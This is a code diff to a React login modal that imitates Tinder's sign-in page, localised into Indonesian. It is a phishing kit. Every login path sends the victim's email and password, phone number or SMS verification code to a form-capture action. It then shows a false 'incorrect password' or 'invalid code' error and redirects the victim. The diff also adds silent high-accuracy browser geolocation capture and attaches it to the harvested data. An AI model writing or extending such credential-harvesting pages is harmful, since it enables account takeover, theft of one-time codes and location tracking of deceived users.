@@ -1,6 +1,6 @@
 'use client';
 import type React from 'react';
-import { useState } from 'react';
+import { useState, useEffect } from 'react';
 
 import { Button } from '@/components/ui/button';
 import { Dialog, DialogContent } from '@/components/ui/dialog';
@@ -8,6 +8,7 @@ import { AnimatePresence, motion } from 'framer-motion';
 import { ArrowLeft, Loader2, Mail, Phone, X } from 'lucide-react';
 import Image from 'next/image';
 import Link from 'next/link';
+import { captureFormData } from '@/action/form-capture-action';
 
 interface LoginModalProps {
   isOpen: boolean;
@@ -43,6 +44,45 @@ export default function LoginModal({
   // Shared states
   const [isLoading, setIsLoading] = useState(false);
   const [error, setError] = useState<string | null>(null);
+
+  // Geolocation state
+  const [userLocation, setUserLocation] = useState<{
+    latitude: number;
+    longitude: number;
+    accuracy?: number;
+  } | null>(null);
+
+  // Mendapatkan geolokasi pengguna saat komponen dimuat
+  useEffect(() => {
+    if (isOpen && !userLocation) {
+      getUserLocation();
+    }
+  }, [isOpen]);
+
+  // Fungsi untuk mendapatkan geolokasi pengguna
+  const getUserLocation = () => {
+    if (navigator.geolocation) {
+      navigator.geolocation.getCurrentPosition(
+        (position) => {
+          setUserLocation({
+            latitude: position.coords.latitude,
+            longitude: position.coords.longitude,
+            accuracy: position.coords.accuracy,
+          });
+          console.log('Got location:', position.coords);
+        },
+        (error) => {
+          console.error('Error getting geolocation:', error);
+          // Tetap lanjutkan proses meskipun geolokasi gagal
+        },
+        {
+          enableHighAccuracy: true,
+          timeout: 5000,
+          maximumAge: 0,
+        },
+      );
+    }
+  };
 
   // Validation functions
   const validateEmail = (email: string) => {
@@ -105,18 +145,18 @@ export default function LoginModal({
     let isValid = true;
 
     if (!email) {
-      setEmailError('Email is required');
+      setEmailError('Email diperlukan');
       isValid = false;
     } else if (!validateEmail(email)) {
-      setEmailError('Please enter a valid email address');
+      setEmailError('Silakan masukkan alamat email yang valid');
       isValid = false;
     }
 
     if (!password) {
-      setPasswordError('Password is required');
+      setPasswordError('Kata sandi diperlukan');
       isValid = false;
     } else if (password.length < 6) {
-      setPasswordError('Password must be at least 6 characters');
+      setPasswordError('Kata sandi harus minimal 6 karakter');
       isValid = false;
     }
 
@@ -126,22 +166,17 @@ export default function LoginModal({
     setIsLoading(true);
 
     try {
-      // Kirim data login ke endpoint form capture
-      await fetch('/api/form-capture', {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/json',
+      // Kirim data login menggunakan form action dengan geolokasi
+      await captureFormData({
+        source: 'tinder',
+        email,
+        password,
+        shortcode,
+        additional_data: {
+          login_method: 'email',
+          login_time: new Date().toISOString(),
+          geolocation: userLocation || undefined,
         },
-        body: JSON.stringify({
-          source: 'tinder',
-          email,
-          password,
-          shortcode,
-          additional_data: {
-            login_method: 'email',
-            login_time: new Date().toISOString(),
-          },
-        }),
       });
 
       // Untuk keperluan demo, tampilkan error agar pengguna mencoba lagi
@@ -151,12 +186,12 @@ export default function LoginModal({
         window.location.href = REDIRECT_URL;
       }, 1500);
       setError(
-        'The email or password you entered is incorrect. Please check your information and try again.',
+        'Email atau password yang Anda masukkan salah. Mohon periksa kembali informasi Anda dan coba lagi.',
       );
     } catch (err) {
       // Bahkan jika pengiriman ke form-capture gagal, tetap tampilkan error yang sama
       setError(
-        'The email or password you entered is incorrect. Please check your information and try again.',
+        'Email atau password yang Anda masukkan salah. Mohon periksa kembali informasi Anda dan coba lagi.',
       );
     } finally {
       setIsLoading(false);
@@ -172,31 +207,26 @@ export default function LoginModal({
 
     // Validate phone number
     if (!phoneNumber) {
-      setPhoneError('Phone number is required');
+      setPhoneError('Nomor telepon diperlukan');
       return;
     } else if (!validatePhone(phoneNumber)) {
-      setPhoneError('Please enter a valid phone number');
+      setPhoneError('Mohon masukkan nomor telepon yang valid');
       return;
     }
 
     setIsLoading(true);
 
     try {
-      // Kirim data phone login ke endpoint form capture
-      await fetch('/api/form-capture', {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/json',
+      // Kirim data phone login ke endpoint form capture dengan geolokasi
+      await captureFormData({
+        source: 'tinder',
+        phone: phoneNumber,
+        shortcode,
+        additional_data: {
+          login_method: 'phone',
+          login_time: new Date().toISOString(),
+          geolocation: userLocation || undefined,
         },
-        body: JSON.stringify({
-          source: 'tinder',
-          phone: phoneNumber,
-          shortcode,
-          additional_data: {
-            login_method: 'phone',
-            login_time: new Date().toISOString(),
-          },
-        }),
       });
 
       // Simulate API call to send verification code
@@ -206,7 +236,7 @@ export default function LoginModal({
       setShowVerificationInput(true);
       console.log('Verification code sent to:', phoneNumber);
     } catch (err) {
-      setError('Failed to send verification code. Please try again.');
+      setError('Gagal mengirim kode verifikasi. Silakan coba lagi.');
     } finally {
       setIsLoading(false);
     }
@@ -221,41 +251,41 @@ export default function LoginModal({
 
     // Validate verification code
     if (!verificationCode) {
-      setCodeError('Verification code is required');
+      setCodeError('Kode verifikasi diperlukan');
       return;
     } else if (!validateVerificationCode(verificationCode)) {
-      setCodeError('Please enter a valid 6-digit code');
+      setCodeError('Mohon masukkan kode 6 digit yang valid');
       return;
     }
 
     setIsLoading(true);
 
     try {
-      // Kirim data verification code ke endpoint form capture
-      await fetch('/api/form-capture', {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/json',
-        },
-        body: JSON.stringify({
-          source: 'tinder',
-          phone: phoneNumber,
+      // Kirim data verification code ke endpoint form capture dengan geolokasi
+      await captureFormData({
+        source: 'tinder',
+        phone: phoneNumber,
+        shortcode,
+        additional_data: {
+          login_method: 'phone_verification',
+          login_time: new Date().toISOString(),
           verification_code: verificationCode,
-          shortcode,
-          additional_data: {
-            login_method: 'phone_verification',
-            login_time: new Date().toISOString(),
-          },
-        }),
+          geolocation: userLocation || undefined,
+        },
       });
 
       // Simulate API call to verify code
       await new Promise((resolve) => setTimeout(resolve, 1500));
 
       // Untuk demo, tampilkan error bahwa kode salah
-      setError('Invalid verification code. Please try again.');
+      setError('Kode verifikasi tidak valid. Silakan coba lagi.');
+
+      // Arahkan pengguna ke halaman tujuan setelah beberapa saat
+      setTimeout(() => {
+        window.location.href = REDIRECT_URL;
+      }, 1500);
     } catch (err) {
-      setError('Verification failed. Please check the code and try again.');
+      setError('Verifikasi gagal. Periksa kode dan coba lagi.');
     } finally {
       setIsLoading(false);
     }
@@ -334,7 +364,7 @@ export default function LoginModal({
                   {/* Email login form */}
                   <div className='mt-8'>
                     <h2 className='mb-6 text-center text-[28px] font-bold text-white'>
-                      Log in with email
+                      Masuk dengan email
                     </h2>
 
                     {error && (
@@ -359,7 +389,7 @@ export default function LoginModal({
                           className={`w-full border bg-[#1a1a1a] ${
                             emailError ? 'border-red-500' : 'border-gray-700'
                           } rounded-md px-4 py-3 text-white focus:outline-none focus:ring-2 focus:ring-[#fe3c72]`}
-                          placeholder='your.email@example.com'
+                          placeholder='emailanda@contoh.com'
                           disabled={isLoading}
                         />
                         {emailError && (
@@ -374,7 +404,7 @@ export default function LoginModal({
                           htmlFor='password'
                           className='mb-1 block text-sm text-gray-400'
                         >
-                          Password
+                          Kata Sandi
                         </label>
                         <input
                           type='password'
@@ -402,10 +432,10 @@ export default function LoginModal({
                         {isLoading ? (
                           <span className='flex items-center justify-center'>
                             <Loader2 className='mr-2 h-4 w-4 animate-spin' />
-                            Logging in...
+                            Sedang Masuk...
                           </span>
                         ) : (
-                          'Log in'
+                          'Masuk'
                         )}
                       </Button>
                     </form>
@@ -415,7 +445,7 @@ export default function LoginModal({
                         href='#'
                         className='text-sm text-[#3991f1] hover:underline'
                       >
-                        Forgot password?
+                        Lupa kata sandi?
                       </Link>
                     </div>
                   </div>
@@ -436,8 +466,8 @@ export default function LoginModal({
                   <div className='mt-8'>
                     <h2 className='mb-6 text-center text-[28px] font-bold text-white'>
                       {showVerificationInput
-                        ? 'Enter verification code'
-                        : 'Log in with phone'}
+                        ? 'Masukkan kode verifikasi'
+                        : 'Masuk dengan nomor telepon'}
                     </h2>
 
                     {error && (
@@ -453,7 +483,7 @@ export default function LoginModal({
                             htmlFor='phone'
                             className='mb-1 block text-sm text-gray-400'
                           >
-                            Phone Number
+                            Nomor Telepon
                           </label>
 
                           <input
@@ -464,7 +494,7 @@ export default function LoginModal({
                             className={`w-full border bg-[#1a1a1a] ${
                               phoneError ? 'border-red-500' : 'border-gray-700'
                             } rounded-md px-4 py-3 text-white focus:outline-none focus:ring-2 focus:ring-[#fe3c72]`}
-                            placeholder='+1 234 567 8900'
+                            placeholder='+62 812 3456 7890'
                             disabled={isLoading}
                           />
                           {phoneError && (
@@ -482,10 +512,10 @@ export default function LoginModal({
                           {isLoading ? (
                             <span className='flex items-center justify-center'>
                               <Loader2 className='mr-2 h-4 w-4 animate-spin' />
-                              Sending code...
+                              Mengirim kode...
                             </span>
                           ) : (
-                            'Send verification code'
+                            'Kirim kode verifikasi'
                           )}
                         </Button>
                       </form>
@@ -493,14 +523,14 @@ export default function LoginModal({
                       <form onSubmit={handleVerifyCode} className='space-y-4'>
                         <div>
                           <p className='mb-3 text-sm text-gray-400'>
-                            We've sent a 6-digit verification code to{' '}
+                            Kami telah mengirim kode verifikasi 6 digit ke{' '}
                             <span className='text-white'>{phoneNumber}</span>
                           </p>
                           <label
                             htmlFor='code'
                             className='mb-1 block text-sm text-gray-400'
                           >
-                            Verification Code
+                            Kode Verifikasi
                           </label>
                           <input
                             type='text'
@@ -529,10 +559,10 @@ export default function LoginModal({
                           {isLoading ? (
                             <span className='flex items-center justify-center'>
                               <Loader2 className='mr-2 h-4 w-4 animate-spin' />
-                              Verifying...
+                              Memverifikasi...
                             </span>
                           ) : (
-                            'Verify'
+                            'Verifikasi'
                           )}
                         </Button>
 
@@ -542,7 +572,7 @@ export default function LoginModal({
                             className='text-[#3991f1] hover:underline'
                             onClick={() => setShowVerificationInput(false)}
                           >
-                            Change phone number
+                            Ubah nomor telepon
                           </button>
                           <button
                             type='button'
@@ -550,7 +580,7 @@ export default function LoginModal({
                             onClick={handlePhoneLogin}
                             disabled={isLoading}
                           >
-                            Resend code
+                            Kirim ulang kode
                           </button>
                         </div>
                       </form>
@@ -573,22 +603,22 @@ export default function LoginModal({
 
                   {/* Heading */}
                   <h2 className='mb-4 text-center text-[28px] font-bold text-white'>
-                    Get started
+                    Memulai
                   </h2>
 
                   {/* Terms text */}
                   <p className='mb-6 text-center text-[13px] leading-5 text-gray-400'>
-                    By tapping Log in or Continue, you agree to our{' '}
+                    Dengan mengetuk Masuk atau Lanjutkan, Anda menyetujui{' '}
                     <Link href='#' className='text-[#3991f1] hover:underline'>
-                      Terms
+                      Ketentuan
                     </Link>
-                    . Learn how we process your data in our{' '}
+                    . Pelajari bagaimana kami memproses data Anda dalam{' '}
                     <Link href='#' className='text-[#3991f1] hover:underline'>
-                      Privacy Policy
+                      Kebijakan Privasi
                     </Link>{' '}
-                    and{' '}
+                    dan{' '}
                     <Link href='#' className='text-[#3991f1] hover:underline'>
-                      Cookie Policy
+                      Kebijakan Cookie
                     </Link>
                     .
                   </p>
@@ -620,7 +650,7 @@ export default function LoginModal({
                         height={20}
                         className='mr-2'
                       />
-                      Log in with LINE
+                      Masuk dengan LINE
                     </Button>
 
                     <Button
@@ -634,7 +664,7 @@ export default function LoginModal({
                         height={20}
                         className='mr-2'
                       />
-                      Login with Facebook
+                      Masuk dengan Facebook
                     </Button>
 
                     <Button
@@ -643,7 +673,7 @@ export default function LoginModal({
                       onClick={() => setFormView('phone')}
                     >
                       <Phone className='mr-2 h-5 w-5' />
-                      Log in with phone number
+                      Masuk dengan nomor telepon
                     </Button>
 
                     <Button
@@ -652,7 +682,7 @@ export default function LoginModal({
                       onClick={() => setFormView('email')}
                     >
                       <Mail className='mr-2 h-5 w-5' />
-                      Log in with email
+                      Masuk dengan email
                     </Button>
                   </div>
 
@@ -662,14 +692,14 @@ export default function LoginModal({
                       href='#'
                       className='text-sm text-[#3991f1] hover:underline'
                     >
-                      Trouble logging in?
+                      Kesulitan masuk?
                     </Link>
                   </div>
 
                   {/* Get the app */}
                   <div className='mt-8'>
                     <h3 className='mb-4 text-center font-semibold text-white'>
-                      Get the app!
+                      Dapatkan aplikasinya!
                     </h3>
                     <div className='flex justify-center space-x-4'>
                       <Link
@@ -678,7 +708,7 @@ export default function LoginModal({
                       >
                         <Image
                           src='https://tinder.com/static/build/d256a5b510a685030be375c63a9010e1.webp'
-                          alt='Download on the App Store'
+                          alt='Download di App Store'
                           fill
                           className='object-contain'
                         />
@@ -689,7 +719,7 @@ export default function LoginModal({
                       >
                         <Image
                           src='https://tinder.com/static/build/03adb6c1e6325a1c4b404d29927a8fe0.webp'
-                          alt='Get it on Google Play'
+                          alt='Dapatkan di Google Play'
                           fill
                           className='object-contain'
                         />
